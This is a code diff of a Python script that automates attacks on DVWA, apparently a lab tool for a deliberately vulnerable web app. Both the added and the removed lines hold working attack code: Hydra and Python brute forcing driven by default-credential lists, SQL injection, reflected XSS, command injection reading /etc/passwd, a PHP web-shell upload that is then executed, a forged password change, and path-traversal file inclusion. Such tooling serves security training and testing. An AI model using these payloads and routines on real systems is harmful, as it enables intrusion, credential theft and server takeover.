@@ -70,28 +70,146 @@ def reconnaissance(url):
     """Perform basic reconnaissance"""
     print("\n[+] Performing HTTP header analysis...")
     r = session.get(url)
-    for key, value in r.headers.items():
-        print(f"    {key}: {value}")
+    print(r.headers)
     
     print("\n[+] Directory brute force (sample)...")
-    for path in ['admin', 'phpmyadmin', 'test', 'backup', 'config', 'setup']:
+    for path in ['admin', 'phpmyadmin', 'test', 'backup']:
         target_url = f"{url}/{path}"
         resp = session.get(target_url)
-        print(f"    {target_url} => {resp.status_code}")
+        print(f"{target_url} => {resp.status_code}")
 
-def brute_force(url, use_python=True):
+def brute_force(url, use_hydra=False):
     """Perform brute force attack using either Python or Hydra"""
-    print("\n[+] Attempting brute force on login...")
-    
-    # List of user:password pairs to try
-    usernames = ["admin", "user", "msfadmin", "root", "postgres", "dbadmin"]
-    passwords = ["password", "admin", "123456", "newpass", "12345", "msfadmin"]
-    
-    login_url = f"{url}/login.php"
-    
-    if use_python:
-        # Python-based brute force
-        print("[i] Using Python-based brute force.")
+    if use_hydra:
+        print("[+] Attempting brute force on login using Hydra with a custom list...")
+
+        # Check if Hydra is installed
+        try:
+            # Use 'which' on Unix-like systems or 'where' on Windows to locate hydra
+            if os.name == 'nt':  # Windows
+                result = subprocess.run(['where', 'hydra'], capture_output=True, text=True)
+            else:  # Unix-like
+                result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
+            
+            if result.returncode == 0 and result.stdout.strip():
+                print(f"[i] Hydra is installed at: {result.stdout.strip()}")
+            else:
+                raise FileNotFoundError("Hydra not found in PATH")
+        except (subprocess.SubprocessError, FileNotFoundError):
+            # Try a direct hydra command as fallback
+            try:
+                # Just attempt to run hydra with a simple argument that won't cause errors
+                subprocess.run(['hydra', '-h'], capture_output=True, timeout=5)
+                print("[i] Hydra is installed and accessible.")
+            except Exception as e:
+                print(f"[!] Hydra verification failed: {e}")
+                print("[!] Please ensure Hydra is properly installed and in your PATH.")
+                print("    Install with: 'sudo apt install hydra' on Debian/Ubuntu or equivalent.")
+                return
+
+        # List of user:password pairs to try
+        COMMON_USERS = ["msfadmin", "user", "postgres", "service", "dbadmin", "tomcat", "newpass", "sys", "klog", "root", "admin"]
+        COMMON_PASSWORDS = ["msfadmin", "password", "s3cr3t", "postgres","new_password", "newpass", "service", "12345", "123456", "admin"]
+
+        # Create a credentials list by combining users and passwords
+        credentials_list = [f"{user}:{password}" for user in COMMON_USERS for password in COMMON_PASSWORDS]
+        
+        login_url = f"{url}/login.php"
+        
+        # Get a fresh user_token for the Hydra command template
+        try:
+            r_token = requests.get(login_url) # Use fresh requests, not session
+            soup_token = BeautifulSoup(r_token.text, 'html.parser')
+            user_token_hydra = soup_token.find('input', {'name': 'user_token'})['value']
+        except Exception as e:
+            print(f"[!] Failed to retrieve user_token for Hydra template: {e}")
+            return
+
+        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_creds_file:
+            for cred in credentials_list:
+                tmp_creds_file.write(cred + '\n')
+            tmp_creds_file_path = tmp_creds_file.name
+
+        print(f"[i] Credentials list for Hydra written to: {tmp_creds_file_path}")
+
+        # Parse the URL to get the correct hostname and port
+        from urllib.parse import urlparse
+        parsed_url = urlparse(url)
+        hostname = parsed_url.hostname or 'localhost'
+        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
+        
+        # Updated Hydra command with form fields as they appear in the actual HTML form
+        # This matches how the fields are structured in the HTML form
+        form_data = (
+            "username=^USER^&"
+            "password=^PASS^&"
+            "Login=Login&"
+            f"user_token={user_token_hydra}"
+        )
+        
+        hydra_command = [
+            'hydra',
+            '-C', tmp_creds_file_path,
+            '-s', str(port),
+            hostname,
+            'http-post-form',
+            f"/dvwa/login.php:{form_data}:S=Logout"
+        ]
+
+        print(f"[i] Executing Hydra: {' '.join(hydra_command)}")
+        print(f"[i] Using form data: {form_data}")
+        
+        found_creds = None
+        try:
+            process = subprocess.run(hydra_command, capture_output=True, text=True, timeout=300)
+            output = process.stdout
+            print("[+] Hydra Output:")
+            print(output)
+
+            # More robust parsing for Hydra's output
+            # Example line: [80][http-post-form] host: localhost   login: admin   password: password
+            match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output, re.IGNORECASE)
+
+            if match and "1 valid password found" in output:
+                found_user = match.group(1)
+                found_password = match.group(2)
+                print(f"[!] Brute force success with Hydra! User: {found_user}, Password: {found_password}")
+
+                # Attempt to login with the found credentials using the main session
+                print(f"[i] Verifying login with found credentials: {found_user}:{found_password}")
+                if login(url, found_user, found_password): # Use the login function
+                    print(f"[+] Successfully logged in with Hydra found credentials: {found_user}:{found_password}")
+                    found_creds = (found_user, found_password)
+                else:
+                    print(f"[-] Hydra reported success, but login verification failed for {found_user}:{found_password}")
+            elif "0 valid passwords found" in output:
+                print("[-] Hydra finished, but no valid passwords found.")
+            else:
+                print("[i] Hydra command executed. Review output for details. It might have failed or found no passwords.")
+                if process.stderr:
+                    print("[!] Hydra Errors:")
+                    print(process.stderr)
+
+        except subprocess.TimeoutExpired:
+            print("[!] Hydra command timed out.")
+        except FileNotFoundError:
+            print("[!] Hydra command not found. Make sure Hydra is installed and in your PATH.")
+        except Exception as e:
+            print(f"[!] An error occurred while running Hydra: {e}")
+        finally:
+            os.remove(tmp_creds_file_path) # Clean up the temporary file
+            print(f"[i] Temporary credentials file {tmp_creds_file_path} removed.")
+
+        return found_creds # Return found credentials or None
+    else:
+        # Python-based brute force implementation
+        print("[+] Attempting brute force on login...")
+        
+        # List of user:password pairs to try
+        usernames = ["admin", "user", "msfadmin", "root", "postgres", "dbadmin"]
+        passwords = ["password", "admin", "123456", "newpass", "12345", "msfadmin"]
+        
+        login_url = f"{url}/login.php"
         
         # Create a new session for brute force to avoid interfering with the main session
         bf_session = requests.Session()
@@ -134,259 +252,87 @@ def brute_force(url, use_python=True):
         
         print("[-] Brute force completed. No valid credentials found.")
         return None
-    else:
-        # Check if Hydra is installed
-        try:
-            if os.name == 'nt':  # Windows
-                result = subprocess.run(['where', 'hydra'], capture_output=True, text=True)
-            else:  # Unix-like
-                result = subprocess.run(['which', 'hydra'], capture_output=True, text=True)
-            
-            if result.returncode == 0 and result.stdout.strip():
-                print(f"[i] Hydra is installed at: {result.stdout.strip()}")
-            else:
-                raise FileNotFoundError("Hydra not found in PATH")
-        except:
-            print("[!] Hydra is not installed. Please install Hydra to use this feature.")
-            print("    Install with: 'sudo apt install hydra' on Debian/Ubuntu or equivalent.")
-            print("[i] Falling back to Python-based brute force.")
-            return brute_force(url, use_python=True)
-        
-        # Create a temp file with credentials
-        cred_list = []
-        for username in usernames:
-            for password in passwords:
-                cred_list.append(f"{username}:{password}")
-        
-        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_creds_file:
-            for cred in cred_list:
-                tmp_creds_file.write(cred + '\n')
-            tmp_creds_file_path = tmp_creds_file.name
-        
-        print(f"[i] Credentials list for Hydra written to: {tmp_creds_file_path}")
-        
-        # Get token for login form
-        try:
-            r_token = requests.get(login_url)
-            soup = BeautifulSoup(r_token.text, 'html.parser')
-            user_token = soup.find('input', {'name': 'user_token'})['value']
-        except Exception as e:
-            print(f"[!] Failed to retrieve user_token: {e}")
-            return None
-        
-        # Parse the URL to get hostname and port
-        from urllib.parse import urlparse
-        parsed_url = urlparse(url)
-        hostname = parsed_url.hostname or 'localhost'
-        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
-        
-        # Run Hydra with proper URL format
-        hydra_command = [
-            'hydra',
-            '-C', tmp_creds_file_path,
-            f"http-post-form://{hostname}:{port}/login.php:username=^USER^&password=^PASS^&Login=Login&user_token={user_token}:S=Logout:F=Login failed"
-        ]
-        
-        print(f"[i] Executing Hydra: {' '.join(hydra_command)}")
-        
-        try:
-            process = subprocess.run(hydra_command, capture_output=True, text=True, timeout=300)
-            output = process.stdout
-            print("[+] Hydra Output:")
-            print(output)
-            
-            # Parse Hydra output for credentials
-            match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output, re.IGNORECASE)
-            
-            if match and "1 valid password found" in output:
-                found_user = match.group(1)
-                found_password = match.group(2)
-                print(f"[!] Brute force success with Hydra! User: {found_user}, Password: {found_password}")
-                
-                # Verify found credentials
-                test_login = login(url, found_user, found_password)
-                if test_login:
-                    print(f"[+] Successfully verified Hydra credentials: {found_user}:{found_password}")
-                    return (found_user, found_password)
-                else:
-                    print(f"[-] Could not verify Hydra credentials: {found_user}:{found_password}")
-            else:
-                print("[-] No valid credentials found by Hydra.")
-        except Exception as e:
-            print(f"[!] Error running Hydra: {e}")
-        finally:
-            # Clean up temp file
-            if os.path.exists(tmp_creds_file_path):
-                os.remove(tmp_creds_file_path)
-                print(f"[i] Temporary credentials file removed.")
-        
-        return None
 
 def sql_injection(url):
     """Test SQL injection vulnerability"""
-    print("\n[+] Performing SQL Injection...")
-    
-    # Test various SQL injection payloads
-    payloads = [
-        "1' OR '1'='1",
-        "1 OR 1=1",
-        "' OR ''='",
-        "1' OR '1'='1' --",
-        "' UNION SELECT 1,2,3,4,5,6,7,8 --"
-    ]
-    
-    for payload in payloads:
-        sqli_url = f"{url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
-        print(f"[i] Trying payload: {payload}")
-        r = session.get(sqli_url)
-        
-        # Check for successful injection indicators
-        if 'First name' in r.text and 'Surname' in r.text:
-            print(f"[!] SQL Injection successful with payload: {payload}")
-            return True
-    
-    print("[-] SQL Injection failed or not vulnerable.")
-    return False
+    print("[+] Performing SQL Injection...")
+    inj_url = f"{url}/vulnerabilities/sqli/?id=1%20OR%201=1--+&Submit=Submit"
+    r = session.get(inj_url)
+    if 'First name' in r.text:
+        print("[!] SQL Injection successful!")
+    else:
+        print("[-] SQL Injection failed or not vulnerable.")
 
 def xss(url):
     """Test Cross-Site Scripting vulnerability"""
-    print("\n[+] Performing XSS attack...")
-    
-    payloads = [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<body onload=alert('XSS')>",
-        "';alert('XSS');//",
-        "<svg/onload=alert('XSS')>"
-    ]
-    
-    for payload in payloads:
-        xss_url = f"{url}/vulnerabilities/xss_r/?name={payload}&Submit=Submit"
-        print(f"[i] Trying XSS payload: {payload}")
-        r = session.get(xss_url)
-        
-        if payload in r.text:
-            print(f"[!] XSS payload reflected: {payload}")
-            return True
-    
-    print("[-] XSS attack failed or not vulnerable.")
-    return False
+    print("[+] Performing XSS attack...")
+    xss_url = f"{url}/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>&Submit=Submit"
+    r = session.get(xss_url)
+    if "<script>alert('XSS')</script>" in r.text:
+        print("[!] XSS payload reflected!")
+    else:
+        print("[-] XSS attack failed or not vulnerable.")
 
 def command_injection(url):
     """Test Command Injection vulnerability"""
-    print("\n[+] Performing Command Injection...")
-    
-    payloads = [
-        "127.0.0.1; cat /etc/passwd",
-        "127.0.0.1 && cat /etc/passwd",
-        "127.0.0.1 | cat /etc/passwd",
-        "127.0.0.1 || cat /etc/passwd",
-        "`cat /etc/passwd`"
-    ]
-    
-    for payload in payloads:
-        ci_url = f"{url}/vulnerabilities/exec/"
-        data = {'ip': payload, 'Submit': 'Submit'}
-        print(f"[i] Trying command: {payload}")
-        r = session.post(ci_url, data=data)
-        
-        if 'root:x:' in r.text or 'www-data' in r.text:
-            print(f"[!] Command Injection successful with: {payload}")
-            return True
-    
-    print("[-] Command Injection failed or not vulnerable.")
-    return False
+    print("[+] Performing Command Injection...")
+    ci_url = f"{url}/vulnerabilities/exec/"
+    data = {'ip': '127.0.0.1; cat /etc/passwd', 'Submit': 'Submit'}
+    r = session.post(ci_url, data=data)
+    if 'root:x:' in r.text:
+        print("[!] Command Injection successful!")
+    else:
+        print("[-] Command Injection failed or not vulnerable.")
 
 def file_upload(url):
     """Test File Upload vulnerability"""
-    print("\n[+] Attempting file upload...")
-    
+    print("[+] Attempting file upload...")
     upload_url = f"{url}/vulnerabilities/upload/"
-    
-    # Test different file types and bypasses
-    test_files = [
-        ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
-        ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
-        ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
-        ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
-    ]
-    
-    for filename, content, content_type in test_files:
-        files = {'uploaded': (filename, content, content_type)}
-        data = {'Upload': 'Upload'}
-        
-        print(f"[i] Trying to upload: {filename}")
-        r = session.post(upload_url, files=files, data=data)
-        
-        if 'succesfully uploaded' in r.text.lower() or filename in r.text:
-            print(f"[!] File upload successful with: {filename}")
-            
-            # Try to execute the uploaded shell
-            shell_url = f"{url}/hackable/uploads/{filename}?cmd=id"
-            r2 = session.get(shell_url)
-            if r2.status_code == 200 and len(r2.text.strip()) > 0:
-                print(f"[+] Shell execution successful! Output:")
-                print(r2.text)
-            return True
-    
-    print("[-] File upload failed or not vulnerable.")
-    return False
+    files = {'uploaded': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
+    data = {'Upload': 'Upload'}
+    r = session.post(upload_url, files=files, data=data)
+    if 'shell.php' in r.text or 'uploads/shell.php' in r.text:
+        print("[!] File upload may be successful!")
+        # Try to execute the uploaded shell
+        shell_url = f"{url}/hackable/uploads/shell.php?cmd=whoami"
+        r2 = session.get(shell_url)
+        if r2.status_code == 200 and r2.text.strip():
+            print("[+] Shell executed! Output:")
+            print(r2.text)
+        else:
+            print("[-] Could not execute uploaded shell or no output.")
+    else:
+        print("[-] File upload failed or not reflected in response.")
 
 def csrf(url):
     """Test Cross-Site Request Forgery vulnerability"""
-    print("\n[+] Attempting CSRF attack (change password)...")
-    
-    # First get the CSRF page to check current state
-    csrf_url = f"{url}/vulnerabilities/csrf/"
-    r = session.get(csrf_url)
-    
-    new_password = 'hacked123'
+    print("[+] Attempting CSRF attack (change password)...")
+    profile_url = f"{url}/vulnerabilities/csrf/"
     
     # Create data for changing password
     data = {
-        'password_new': new_password,
-        'password_conf': new_password,
+        'password_new': 'newpass',
+        'password_conf': 'newpass',
         'Change': 'Change'
     }
-    
     # Submit via GET (CSRF scenario)
     query_params = "&".join([f"{key}={value}" for key, value in data.items()])
-    exploit_url = f"{csrf_url}?{query_params}"
-    
-    print(f"[i] Sending CSRF request to: {exploit_url}")
-    resp = session.get(exploit_url)
-    
+    csrf_url = f"{profile_url}?{query_params}"
+    resp = session.get(csrf_url)
     if 'Password Changed' in resp.text:
-        print(f"[!] CSRF successful! Password changed to: {new_password}")
-        return True
+        print("[!] CSRF successful!")
     else:
         print("[-] CSRF attack failed or not vulnerable.")
-        return False
 
 def lfi(url):
     """Test Local File Inclusion vulnerability"""
-    print("\n[+] Attempting LFI (Local File Inclusion)...")
-    
-    # Test various LFI payloads
-    payloads = [
-        "../../../../../etc/passwd",
-        "../../../../../../etc/passwd",
-        "../../../../../../../../../etc/passwd",
-        "....//....//....//....//....//etc/passwd",
-        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
-    ]
-    
-    for payload in payloads:
-        lfi_url = f"{url}/vulnerabilities/fi/?page={payload}"
-        print(f"[i] Trying LFI payload: {payload}")
-        r = session.get(lfi_url)
-        
-        if 'root:x:' in r.text:
-            print(f"[!] LFI successful with: {payload}")
-            return True
-    
-    print("[-] LFI failed or not vulnerable.")
-    return False
+    print("[+] Attempting LFI (Low Security)...")
+    lfi_url = f"{url}/vulnerabilities/fi/?page=../../../../../etc/passwd"
+    r = session.get(lfi_url)
+    if 'root:x:' in r.text:
+        print("[!] LFI successful!")
+    else:
+        print("[-] LFI failed or not vulnerable at low security.")
 
 def logout(url):
     """Log out from DVWA"""
@@ -396,14 +342,11 @@ def logout(url):
         r_check = session.get(url + "/index.php")
         if "Logout" in r_check.text:
             session.get(f"{url}/logout.php")
-            print("[+] Logged out successfully.")
-            return True
+            print("[+] Logged out.")
         else:
             print("[i] Not logged in or session expired, skipping logout.")
-            return False
     except requests.exceptions.RequestException as e:
-        print(f"[!] Error during logout: {e}")
-        return False
+        print(f"[!] Error during logout check: {e}")
 
 def main():
     """Main function to run the attack automation"""
@@ -434,7 +377,7 @@ def main():
         reconnaissance(args.url)
     
     if args.attacks in ["all", "brute"]:
-        brute_force(args.url, not args.hydra)  # Use Python by default
+        brute_force(args.url, args.hydra)  # Use Hydra if specified
     
     # Re-login to ensure session is valid for other attacks
     if args.attacks == "all":
